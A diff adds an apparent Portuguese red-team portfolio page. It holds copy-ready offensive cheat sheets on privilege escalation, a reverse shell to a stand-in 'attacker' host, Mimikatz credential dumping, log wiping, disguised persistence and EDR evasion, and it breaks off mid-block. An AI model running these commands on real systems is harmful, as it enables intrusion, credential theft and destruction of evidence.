@@ -1,0 +1,2009 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Vitor Oliveira — Skills Interativas</title>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg: #090d1a;
+      --bg2: #0f1526;
+      --bg3: #151c30;
+      --red: #e63946;
+      --red-dim: #8b1e26;
+      --blue: #3b82f6;
+      --green: #10b981;
+      --text: #c9d1e0;
+      --text-dim: #6b7a99;
+      --text-bright: #eef2ff;
+      --mono: 'Share Tech Mono', monospace;
+      --sans: 'Inter', sans-serif;
+      --border: rgba(255,255,255,0.07);
+    }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--sans);
+      font-size: 16px;
+      line-height: 1.7;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    a { color: var(--blue); text-decoration: none; transition: color 0.2s; }
+    a:hover { color: var(--text-bright); }
+
+    /* NAV */
+    nav {
+      position: fixed; top: 0; left: 0; right: 0; z-index: 100;
+      background: rgba(9, 13, 26, 0.92);
+      backdrop-filter: blur(12px);
+      border-bottom: 1px solid var(--border);
+      padding: 0 2rem;
+      height: 56px;
+      display: flex; align-items: center; justify-content: space-between;
+    }
+    .nav-logo {
+      font-family: var(--mono);
+      font-size: 14px;
+      color: var(--red);
+      letter-spacing: 0.05em;
+    }
+    .nav-back {
+      font-size: 13px;
+      color: var(--text-dim);
+      cursor: pointer;
+      transition: color 0.2s;
+    }
+    .nav-back:hover { color: var(--text-bright); }
+
+    /* CONTAINER */
+    .container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 100px 2rem 2rem;
+    }
+
+    h1 {
+      color: var(--text-bright);
+      font-size: 2.5rem;
+      margin-bottom: 2rem;
+      margin-top: 3rem;
+    }
+
+    .section-label {
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--red);
+      letter-spacing: 0.15em;
+      text-transform: uppercase;
+      margin-bottom: 1rem;
+      margin-top: 2rem;
+    }
+
+    /* SKILLS GRID */
+    .skills-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+      gap: 1rem;
+      margin-bottom: 3rem;
+    }
+
+    .skill-btn {
+      background: var(--bg2);
+      border: 1px solid var(--border);
+      color: var(--text);
+      padding: 1rem;
+      border-radius: 8px;
+      cursor: pointer;
+      font-family: var(--mono);
+      font-size: 13px;
+      transition: all 0.2s;
+      text-align: center;
+      font-weight: 500;
+    }
+
+    .skill-btn:hover {
+      border-color: var(--red);
+      color: var(--text-bright);
+      transform: translateY(-2px);
+    }
+
+    .skill-btn.highlight {
+      border-color: var(--red-dim);
+      color: var(--red);
+    }
+
+    .skill-btn.highlight:hover {
+      border-color: var(--red);
+      background: rgba(230, 57, 70, 0.1);
+    }
+
+    /* MODAL */
+    .modal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.7);
+      z-index: 1000;
+      align-items: center;
+      justify-content: center;
+      animation: fadeIn 0.3s ease;
+    }
+
+    .modal.active {
+      display: flex;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    .modal-content {
+      background: var(--bg2);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      max-width: 800px;
+      max-height: 90vh;
+      overflow-y: auto;
+      padding: 2rem;
+      position: relative;
+      animation: slideUp 0.3s ease;
+    }
+
+    @keyframes slideUp {
+      from {
+        transform: translateY(30px);
+        opacity: 0;
+      }
+      to {
+        transform: translateY(0);
+        opacity: 1;
+      }
+    }
+
+    .modal-close {
+      position: absolute;
+      top: 1rem;
+      right: 1rem;
+      background: none;
+      border: none;
+      color: var(--text-dim);
+      font-size: 24px;
+      cursor: pointer;
+      transition: color 0.2s;
+    }
+
+    .modal-close:hover {
+      color: var(--text-bright);
+    }
+
+    .modal h2 {
+      color: var(--text-bright);
+      font-size: 1.8rem;
+      margin-bottom: 1rem;
+      margin-top: 0;
+    }
+
+    .modal h3 {
+      color: var(--red);
+      font-size: 1.1rem;
+      margin-top: 1.5rem;
+      margin-bottom: 0.75rem;
+    }
+
+    .modal p {
+      color: var(--text);
+      line-height: 1.8;
+      margin-bottom: 1rem;
+    }
+
+    .code-block {
+      background: var(--bg3);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 1rem;
+      margin: 1rem 0;
+      font-family: var(--mono);
+      font-size: 12px;
+      overflow-x: auto;
+      color: var(--green);
+      line-height: 1.5;
+      position: relative;
+    }
+
+    .copy-btn {
+      position: absolute;
+      top: 0.5rem;
+      right: 0.5rem;
+      background: var(--red);
+      color: white;
+      border: none;
+      padding: 0.4rem 0.8rem;
+      border-radius: 4px;
+      font-size: 11px;
+      cursor: pointer;
+      opacity: 0;
+      transition: opacity 0.2s;
+    }
+
+    .code-block:hover .copy-btn {
+      opacity: 1;
+    }
+
+    .copy-btn:hover {
+      background: #c1121f;
+    }
+
+    .info-box {
+      background: rgba(16, 185, 129, 0.1);
+      border-left: 4px solid var(--green);
+      padding: 1rem;
+      border-radius: 4px;
+      margin: 1rem 0;
+      font-size: 14px;
+    }
+
+    .warning-box {
+      background: rgba(230, 57, 70, 0.1);
+      border-left: 4px solid var(--red);
+      padding: 1rem;
+      border-radius: 4px;
+      margin: 1rem 0;
+      font-size: 14px;
+    }
+
+    ul, ol {
+      margin-left: 1.5rem;
+      margin-bottom: 1rem;
+    }
+
+    li {
+      margin-bottom: 0.5rem;
+    }
+
+    /* SCROLL */
+    ::-webkit-scrollbar {
+      width: 8px;
+    }
+    ::-webkit-scrollbar-track {
+      background: var(--bg3);
+    }
+    ::-webkit-scrollbar-thumb {
+      background: var(--red-dim);
+      border-radius: 4px;
+    }
+    ::-webkit-scrollbar-thumb:hover {
+      background: var(--red);
+    }
+
+    @media (max-width: 768px) {
+      .container {
+        padding: 80px 1rem 1rem;
+      }
+      .modal-content {
+        max-width: 95vw;
+        margin: 1rem;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<nav>
+  <span class="nav-logo">vitor@redteam:~$ skills</span>
+  <a href="index.html" class="nav-back">← Voltar ao Portfólio</a>
+</nav>
+
+<div class="container">
+  <h1>🛠️ Skills Interativas</h1>
+  <p style="color: var(--text-dim); margin-bottom: 2rem;">Clique em cada skill para ver descrição, comandos e exemplos práticos</p>
+
+  <!-- OFENSIVO -->
+  <div class="section-label">// OFENSIVO</div>
+  <div class="skills-grid">
+    <button class="skill-btn highlight" onclick="openModal('red-team')">Red Team</button>
+    <button class="skill-btn highlight" onclick="openModal('pentest')">Pentest</button>
+    <button class="skill-btn" onclick="openModal('priv-esc-win')">Privilege Escalation (Windows)</button>
+    <button class="skill-btn" onclick="openModal('priv-esc-linux')">Privilege Escalation (Linux)</button>
+    <button class="skill-btn" onclick="openModal('lateral-movement')">Lateral Movement</button>
+    <button class="skill-btn" onclick="openModal('opsec')">OPSEC</button>
+    <button class="skill-btn" onclick="openModal('edr-evasion')">EDR Evasion</button>
+    <button class="skill-btn" onclick="openModal('post-exploit')">Post-Exploitation</button>
+  </div>
+
+  <!-- FERRAMENTAS -->
+  <div class="section-label">// FERRAMENTAS</div>
+  <div class="skills-grid">
+    <button class="skill-btn" onclick="openModal('burp')">Burp Suite</button>
+    <button class="skill-btn" onclick="openModal('bloodhound')">BloodHound</button>
+    <button class="skill-btn" onclick="openModal('nxc')">NXC (NetExec)</button>
+    <button class="skill-btn" onclick="openModal('nmap')">Nmap</button>
+    <button class="skill-btn" onclick="openModal('metasploit')">Metasploit</button>
+    <button class="skill-btn" onclick="openModal('sqlmap')">SQLMap</button>
+    <button class="skill-btn" onclick="openModal('impacket')">Impacket</button>
+    <button class="skill-btn" onclick="openModal('mimikatz')">Mimikatz</button>
+  </div>
+
+  <!-- AMBIENTES & FRAMEWORKS -->
+  <div class="section-label">// AMBIENTES & FRAMEWORKS</div>
+  <div class="skills-grid">
+    <button class="skill-btn" onclick="openModal('ad')">Active Directory</button>
+    <button class="skill-btn" onclick="openModal('windows')">Windows (Malicioso & Detecção)</button>
+    <button class="skill-btn" onclick="openModal('linux')">Linux (Malicioso & Detecção)</button>
+    <button class="skill-btn" onclick="openModal('mitre-attack')">MITRE ATT&CK</button>
+    <button class="skill-btn" onclick="openModal('ttps')">TTPs</button>
+  </div>
+
+  <!-- DEFENSIVO -->
+  <div class="section-label">// DEFENSIVO</div>
+  <div class="skills-grid">
+    <button class="skill-btn" onclick="openModal('siem')">SIEM / Log Analysis</button>
+    <button class="skill-btn" onclick="openModal('incident-response')">Incident Response</button>
+    <button class="skill-btn" onclick="openModal('threat-detection')">Threat Detection</button>
+    <button class="skill-btn" onclick="openModal('detection-tuning')">Detection Rule Tuning</button>
+  </div>
+</div>
+
+<!-- MODALS -->
+
+<!-- Red Team -->
+<div id="red-team" class="modal" onclick="if(event.target === this) closeModal('red-team')">
+  <div class="modal-content">
+    <button class="modal-close" onclick="closeModal('red-team')">✕</button>
+    <h2>🔴 Red Team</h2>
+    <p>Simular adversários reais em operações estruturadas de teste de segurança, cobrindo todo o Cyber Kill Chain.</p>
+
+    <h3>O que é</h3>
+    <p>Red Team é uma simulação realista de um ataque APT, onde o objetivo é testar não apenas a defesa técnica, mas também processos, pessoas e procedimentos.</p>
+
+    <h3>Para que serve</h3>
+    <ul>
+      <li>Testar resposta a incidentes</li>
+      <li>Validar controles de segurança</li>
+      <li>Treinar time de defesa</li>
+      <li>Identificar gaps em detecção</li>
+    </ul>
+
+    <h3>Fases do Red Team</h3>
+    <div class="code-block">
+1. Reconhecimento (OSINT passivo)
+2. Weaponização (criar payloads)
+3. Entrega (phishing, watering hole)
+4. Exploração (explorar vulnerabilidade)
+5. Instalação (persistência)
+6. C2 (Command & Control)
+7. Ações nos Objetivos (lateral movement, data exfil)
+    </div>
+
+    <h3>Ferramentas principais</h3>
+    <div class="code-block">
+nmap -sS -p- target.com
+subfinder -d target.com
+BloodHound (AD mapping)
+Burp Suite (web testing)
+Metasploit (exploitation)
+HAVOC C2 (command & control)
+    </div>
+
+    <div class="info-box">
+      <strong>💡 Dica:</strong> Red Teams focam em OPSEC, evasão e persistência — não é apenas exploração rápida, é operação realista.
+    </div>
+  </div>
+</div>
+
+<!-- Pentest -->
+<div id="pentest" class="modal" onclick="if(event.target === this) closeModal('pentest')">
+  <div class="modal-content">
+    <button class="modal-close" onclick="closeModal('pentest')">✕</button>
+    <h2>🔍 Pentest (Penetration Testing)</h2>
+    <p>Teste de penetração estruturado para identificar vulnerabilidades em sistemas, aplicações e infraestrutura.</p>
+
+    <h3>O que é</h3>
+    <p>Pentest é um teste de segurança autorizado onde você tenta explorar vulnerabilidades para medir a postura de segurança.</p>
+
+    <h3>Diferença: Pentest vs Red Team</h3>
+    <ul>
+      <li><strong>Pentest:</strong> Encontrar vulnerabilidades (goal: relatório)</li>
+      <li><strong>Red Team:</strong> Simular adversário real (goal: testar defesa)</li>
+    </ul>
+
+    <h3>Fases do Pentest</h3>
+    <div class="code-block">
+1. Reconhecimento (passive + active)
+2. Scanning (vulnerabilidades)
+3. Enumeração (informações detalhadas)
+4. Exploração (confirmação de vulns)
+5. Pós-exploração (impacto)
+6. Relatório (findings + recomendações)
+    </div>
+
+    <h3>Comando rápido para iniciar</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+nmap -A -p- target.com -o nmap_results.txt
+burpsuite &
+sqlmap -u "http://target.com?id=1" --dbs
+    </div>
+
+    <h3>Ferramentas por fase</h3>
+    <ul>
+      <li><strong>Scanning:</strong> Nmap, Nessus, OpenVAS</li>
+      <li><strong>Web:</strong> Burp Suite, OWASP ZAP</li>
+      <li><strong>Exploitation:</strong> Metasploit, Impacket</li>
+      <li><strong>Reporting:</strong> Burp, Nessus, Dradis</li>
+    </ul>
+  </div>
+</div>
+
+<!-- Privilege Escalation Windows -->
+<div id="priv-esc-win" class="modal" onclick="if(event.target === this) closeModal('priv-esc-win')">
+  <div class="modal-content">
+    <button class="modal-close" onclick="closeModal('priv-esc-win')">✕</button>
+    <h2>🪟 Privilege Escalation — Windows</h2>
+    <p>Técnicas para elevar privilégios de usuário comum para administrador/SYSTEM.</p>
+
+    <h3>O que é</h3>
+    <p>Privilege Escalation é o processo de ganhar permissões maiores após acesso inicial (ex: user → admin).</p>
+
+    <h3>Verificar privilégios atuais</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+whoami /all
+whoami /priv
+Get-Identity
+    </div>
+
+    <h3>Técnicas comuns (Windows)</h3>
+
+    <h4>1. UAC Bypass</h4>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Via COM object (fodhelper)
+C:\Windows\System32\fodhelper.exe
+
+# Via registry
+reg add HKCU\Software\Classes\ms-settings\shell\open\command /v "" /d "C:\beacon.exe" /f
+start ms-settings:
+    </div>
+
+    <h4>2. Service Vulnerability</h4>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+accesschk64.exe -accepteula -nobanner /w "Authenticated Users" c:\
+# Se "Authenticated Users" pode escrever no diretório do serviço
+# Substituir DLL/EXE e reiniciar o serviço
+sc query state=all | findstr /i "SERVICE_NAME"
+    </div>
+
+    <h4>3. DLL Hijacking</h4>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Procurar por DLLs faltando
+Procmon.exe → filtrar "NAME NOT FOUND"
+# Injetar DLL malicioso no caminho procurado
+    </div>
+
+    <h4>4. Kernel Exploit</h4>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+systeminfo > info.txt
+# Usar WES.py para encontrar CVEs
+python wes.py info.txt
+# Baixar exploit e executar
+    </div>
+
+    <h4>5. Credentials em memória</h4>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+# Copiar hash NTLM e fazer Pass-the-Hash
+    </div>
+
+    <div class="warning-box">
+      <strong>⚠️ Detecção:</strong> Monitore changes em services, registry UAC, DLL injection (Module Load), Kernel exploits.
+    </div>
+  </div>
+</div>
+
+<!-- Privilege Escalation Linux -->
+<div id="priv-esc-linux" class="modal" onclick="if(event.target === this) closeModal('priv-esc-linux')">
+  <div class="modal-content">
+    <button class="modal-close" onclick="closeModal('priv-esc-linux')">✕</button>
+    <h2>🐧 Privilege Escalation — Linux</h2>
+    <p>Técnicas para elevar privilégios de usuário comum para root em Linux.</p>
+
+    <h3>Verificar privilégios atuais</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+id
+sudo -l
+groups
+    </div>
+
+    <h3>Técnicas comuns (Linux)</h3>
+
+    <h4>1. Sudo Misconfiguration</h4>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+sudo -l
+# Se pode rodar comando sem senha:
+sudo -u root /usr/bin/python -c "import os; os.system('/bin/bash')"
+
+# NOPASSWD abuse
+# Se sudoers permite: user ALL=(root) NOPASSWD: /usr/bin/python
+sudo /usr/bin/python -c "import os; os.execvp('bash', ['bash'])"
+    </div>
+
+    <h4>2. SUID Binary Abuse</h4>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Encontrar SUID binaries
+find / -perm -4000 2>/dev/null
+
+# Exemplo: /usr/bin/passwd é SUID
+# Alguns binários podem ser abusados
+# Consultar GTFOBins: https://gtfobins.github.io/
+/usr/bin/find . -exec /bin/bash \; -quit
+    </div>
+
+    <h4>3. Kernel Exploit</h4>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+uname -a
+# Procurar CVEs para versão do kernel
+# Compilar e executar exploit
+gcc exploit.c -o exploit
+./exploit
+    </div>
+
+    <h4>4. Credential Hunting</h4>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+cat ~/.bash_history
+cat ~/.ssh/authorized_keys
+grep -r "password" /var/www 2>/dev/null
+find / -name "*.sql" 2>/dev/null
+    </div>
+
+    <h4>5. Cron Jobs</h4>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+crontab -l
+cat /etc/crontab
+ls -la /etc/cron.d/
+
+# Se script malformado ou writable:
+echo "bash -i >& /dev/tcp/attacker/4444 0>&1" >> script.sh
+    </div>
+
+    <h3>Ferramentas úteis</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Enum automática
+LinEnum.sh
+linpeas.sh
+    </div>
+
+    <div class="warning-box">
+      <strong>⚠️ Detecção:</strong> Monitore sudo execução, SUID binary access, cron job modifications, kernel version exploits.
+    </div>
+  </div>
+</div>
+
+<!-- Lateral Movement -->
+<div id="lateral-movement" class="modal" onclick="if(event.target === this) closeModal('lateral-movement')">
+  <div class="modal-content">
+    <button class="modal-close" onclick="closeModal('lateral-movement')">✕</button>
+    <h2>↔️ Lateral Movement</h2>
+    <p>Técnicas para se mover entre hosts/usuários/domínios após acesso inicial.</p>
+
+    <h3>Técnicas principais</h3>
+
+    <h4>Pass-the-Hash (Windows)</h4>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Dump hash via mimikatz
+mimikatz > sekurlsa::logonpasswords
+# Copiar NTLM hash
+
+# Usar hash para autenticar
+pth-winexe -U user%NTLM_HASH //target cmd.exe
+crackmapexec smb 192.168.1.100 -u admin -H aad3b435b51404ee:e52caf7f1c5439a87dcf22f57409e63e -x "whoami"
+    </div>
+
+    <h4>Pass-the-Ticket (Kerberos)</h4>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Dump ticket
+mimikatz > kerberos::list
+
+# Reutilizar ticket
+mimikatz > kerberos::ptt ticket.kirbi
+
+# Ou via secretsdump
+secretsdump.py domain/user:pass@target
+psexec.py -k -no-pass domain/user@target
+    </div>
+
+    <h4>Kerberoasting</h4>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+GetUserSPNs.py -request domain/user:pass
+# Crack hashes offline
+hashcat -m 13100 spn_hashes.txt wordlist.txt
+    </div>
+
+    <h4>Psexec</h4>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+psexec.py domain/user:pass@target cmd
+psexec.py domain/user:pass@target -c beacon.exe
+    </div>
+
+    <h3>Ferramentas</h3>
+    <ul>
+      <li>Impacket (secretsdump, psexec, GetUserSPNs)</li>
+      <li>Mimikatz (credential dumping)</li>
+      <li>BloodHound (AD path mapping)</li>
+      <li>CrackMapExec (multi-host testing)</li>
+    </ul>
+  </div>
+</div>
+
+<!-- OPSEC -->
+<div id="opsec" class="modal" onclick="if(event.target === this) closeModal('opsec')">
+  <div class="modal-content">
+    <button class="modal-close" onclick="closeModal('opsec')">✕</button>
+    <h2>🔐 OPSEC (Operational Security)</h2>
+    <p>Práticas para manter sigilo e segurança durante operações ofensivas.</p>
+
+    <h3>Princípios</h3>
+    <ul>
+      <li>Minimizar evidência deixada</li>
+      <li>Evitar detecção de IDS/IPS/EDR</li>
+      <li>Proteger identidade real</li>
+      <li>Compartimentalizar operações</li>
+    </ul>
+
+    <h3>Checklist OPSEC</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+☐ Usar VPN/Proxy para conexões
+☐ Usar domínio legítimo para C2
+☐ Certificado SSL válido (não self-signed)
+☐ Jitter nas comunicações (não regular)
+☐ User-Agent realista
+☐ Evitar executar comportamentos suspeitos juntos
+☐ Limpar logs após operação
+☐ Não reutilizar infraestrutura
+☐ Comunicação encriptada
+☐ Monitorar threads de segurança
+    </div>
+
+    <h3>Limpeza de Logs</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Windows
+wevtutil cl System
+wevtutil cl Security
+wevtutil cl Application
+
+# Linux
+history -c
+rm /var/log/* -rf
+shred -vfz -n 5 /var/log/auth.log
+    </div>
+
+    <div class="warning-box">
+      <strong>⚠️ Aviso:</strong> Limpeza agressiva de logs É detectável. Considerar deixar alguns logs mistos.
+    </div>
+  </div>
+</div>
+
+<!-- EDR Evasion -->
+<div id="edr-evasion" class="modal" onclick="if(event.target === this) closeModal('edr-evasion')">
+  <div class="modal-content">
+    <button class="modal-close" onclick="closeModal('edr-evasion')">✕</button>
+    <h2>👻 EDR Evasion</h2>
+    <p>Técnicas para contornar Endpoint Detection and Response (EDR).</p>
+
+    <h3>Tipos de detecção EDR</h3>
+    <ul>
+      <li><strong>Assinatura:</strong> Pattern matching conhecido</li>
+      <li><strong>Heurística:</strong> Análise comportamental estática</li>
+      <li><strong>Comportamental:</strong> Monitoramento em tempo real</li>
+    </ul>
+
+    <h3>Técnicas de Evasão</h3>
+
+    <h4>1. Syscall Direto (Bypass API hooks)</h4>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Chamar syscall direto em assembly
+# Evita hooks de EDR em Win32 API
+mov rax, syscall_number
+syscall
+    </div>
+
+    <h4>2. Process Injection</h4>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Injetar code em processo legítimo (explorer.exe)
+VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
+# Payload roda como filho de explorer.exe (legítimo)
+    </div>
+
+    <h4>3. Fileless Execution</h4>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# PowerShell reflection (carregar EXE em memória)
+$bytes = [System.IO.File]::ReadAllBytes('beacon.exe')
+[System.Reflection.Assembly]::Load($bytes).GetType('Namespace.Class').GetMethod('Main').Invoke($null, $null)
+    </div>
+
+    <h4>4. Living off the Land</h4>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Usar binários legítimos do Windows
+msiexec /V /Z "beacon.msi"
+regsvcs.exe beacon.dll
+InstallUtil.exe beacon.exe
+powershell.exe -ep bypass
+    </div>
+
+    <h3>Detecção vs Evasão</h3>
+    <p><strong>EDR monitora:</strong> Syscalls, Process creation, Memory injection, Registry changes, Network connections</p>
+    <p><strong>Evitar:</strong> Comportamentos conhecidos de malware (ex: open LSASS, inject rundll32)</strong></p>
+  </div>
+</div>
+
+<!-- Post-Exploitation -->
+<div id="post-exploit" class="modal" onclick="if(event.target === this) closeModal('post-exploit')">
+  <div class="modal-content">
+    <button class="modal-close" onclick="closeModal('post-exploit')">✕</button>
+    <h2>⚔️ Post-Exploitation</h2>
+    <p>Atividades realizadas após exploração inicial com sucesso.</p>
+
+    <h3>Fases pós-exploração</h3>
+    <ol>
+      <li>Estabilização (manter acesso)</li>
+      <li>Enumeração (mapear rede)</li>
+      <li>Lateral Movement (se mover)</li>
+      <li>Privilege Escalation (aumentar privs)</li>
+      <li>Persistência (manter acesso)</li>
+      <li>Exfiltração (roubar dados)</li>
+    </ol>
+
+    <h3>Dump de Credenciais</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Mimikatz (LSASS dump)
+mimikatz.exe
+sekurlsa::logonpasswords
+sekurlsa::minidump lsass.dmp
+
+# SAM dump
+reg save HKLM\SAM sam
+reg save HKLM\SYSTEM system
+creddump7 system sam
+
+# NTDS.dit (DC)
+ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
+    </div>
+
+    <h3>Enumeração de AD</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+Get-ADUser -Filter * -Properties * | select Name,adminCount,LastLogonDate
+Get-ADGroup -Filter {adminCount -eq 1}
+Get-ADComputer -Filter * | select Name
+
+# BloodHound
+SharpHound.exe -c All
+# Upload em BloodHound UI
+    </div>
+
+    <h3>Persistência</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Registry RUN key
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Svchost /t REG_SZ /d "C:\beacon.exe"
+
+# Scheduled Task
+schtasks /create /tn "Windows Update" /tr "C:\beacon.exe" /sc minute /mo 5
+
+# Service
+sc create Svchost binPath= "C:\beacon.exe"
+sc start Svchost
+    </div>
+  </div>
+</div>
+
+<!-- Burp Suite -->
+<div id="burp" class="modal" onclick="if(event.target === this) closeModal('burp')">
+  <div class="modal-content">
+    <button class="modal-close" onclick="closeModal('burp')">✕</button>
+    <h2>🔵 Burp Suite</h2>
+    <p>Proxy web e scanner de vulnerabilidades líder em testes de aplicações web.</p>
+
+    <h3>Funcionalidades principais</h3>
+    <ul>
+      <li><strong>Proxy:</strong> Interceptar/modificar requests HTTP</li>
+      <li><strong>Scanner:</strong> Scan automático de vulnerabilidades</li>
+      <li><strong>Intruder:</strong> Fuzzing e brute-force</li>
+      <li><strong>Repeater:</strong> Testar requests customizadas</li>
+      <li><strong>Decoder:</strong> Encoding/decoding</li>
+    </ul>
+
+    <h3>Workflow básico</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+1. Abrir Burp Suite
+2. Configurar proxy (127.0.0.1:8080)
+3. Target → Scope → Add target URL
+4. Navegar no browser (tráfego capturado)
+5. Proxy → Intercept → Review requests
+6. Scanner → Active/Passive Scan
+7. Issues → Revisar vulnerabilidades
+    </div>
+
+    <h3>Scan ativo vs Passivo</h3>
+    <ul>
+      <li><strong>Passivo:</strong> Analisa requests/responses capturadas (sem gerar novo tráfego)</li>
+      <li><strong>Ativo:</strong> Envia requests customizadas para testar vulns (barulhento)</li>
+    </ul>
+
+    <h3>Intruder (Fuzzing)</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+1. Intruder → Positions → Selecionar payload markers (§)
+2. Payloads → Load wordlist
+3. Resource Pool → Aumentar threads
+4. Start attack
+5. Analisar resultados (status code, resposta)
+    </div>
+
+    <div class="info-box">
+      <strong>💡 Dica:</strong> Use "Scope" para focar apenas em URLs alvo, reduz falsos positivos no scanner.
+    </div>
+  </div>
+</div>
+
+<!-- BloodHound -->
+<div id="bloodhound" class="modal" onclick="if(event.target === this) closeModal('bloodhound')">
+  <div class="modal-content">
+    <button class="modal-close" onclick="closeModal('bloodhound')">✕</button>
+    <h2>🩸 BloodHound</h2>
+    <p>Visualiza relacionamentos e caminhos de ataque em Active Directory.</p>
+
+    <h3>O que faz</h3>
+    <p>BloodHound mapeia usuários, grupos, computadores e relações de permissão em AD, mostrando caminhos de ataque até Domain Admin.</p>
+
+    <h3>Instalação & Coleta</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Download SharpHound collector
+.\SharpHound.exe -c All
+
+# Ou via Python (Linux)
+python3 bloodhound.py -d domain.com -u user -p pass -c All
+    </div>
+
+    <h3>Análise de dados</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+1. Abrir BloodHound (Neo4j backend)
+2. Upload .zip coletado
+3. Home → Queries pré-prontas
+   - Find Shortest Path to DA
+   - Find users with AD recycle bin rights
+   - Find High Value Targets
+4. Analisar visual
+    </div>
+
+    <h3>Queries customizadas</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Encontrar usuários com privilégio adminCount
+MATCH (u:User) WHERE u.adminCount = true RETURN u
+
+# Encontrar path mais curto a Domain Admin
+MATCH p=shortestPath((u:User)-[*..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.COM"})) RETURN p
+    </div>
+
+    <h3>Técnicas encontradas no BH</h3>
+    <ul>
+      <li>Constrained Delegation</li>
+      <li>Unconstrained Delegation</li>
+      <li>Resource-based Constrained Delegation</li>
+      <li>GenericWrite/GenericAll permissions</li>
+      <li>Kerberoasting opportunities</li>
+    </ul>
+
+    <div class="info-box">
+      <strong>💡 Dica:</strong> Depois de explorar um caminho, marque como "Compromised" no BH para acompanhar progresso.
+    </div>
+  </div>
+</div>
+
+<!-- NXC (NetExec) -->
+<div id="nxc" class="modal" onclick="if(event.target === this) closeModal('nxc')">
+  <div class="modal-content">
+    <button class="modal-close" onclick="closeModal('nxc')">✕</button>
+    <h2>🌐 NXC (NetExec)</h2>
+    <p>Ferramenta moderna para testes de segurança em redes SMB/LDAP/Kerberos (successor do CrackMapExec).</p>
+
+    <h3>Funcionalidades</h3>
+    <ul>
+      <li>Descoberta de hosts e enumeração</li>
+      <li>Validação de credenciais (spray)</li>
+      <li>Execução remota de comandos</li>
+      <li>Pass-the-Hash / Pass-the-Ticket</li>
+      <li>Dumping de hashes</li>
+      <li>Módulos customizáveis</li>
+    </ul>
+
+    <h3>Instalação</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+pip install nxc
+# ou
+apt install nxc
+    </div>
+
+    <h3>Uso básico</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
+# Descobrir hosts vivos
+nxc smb 192.168.1.0/24
+
+# Validar credenciais
+nxc smb 192.168.1.100 -u user -p pass
+
+# Spray (testar múltiplos usuários/senhas)
+nxc smb 192.168.1.0/24 -u users.txt -p pass.txt --continue-on-success
+
+# Execução remota
+nxc smb 192.168.1.100 -u admin -p pass -x "whoami"
+
+# Dump de SAM
+nxc smb 192.168.1.100 -u admin -p pass --sam
+    </div>
+
+    <h3>Pass-the-Hash</h3>
+    <div class="code-block">
+<span class="copy-btn" onclick="copyCode(this)">📋</span>
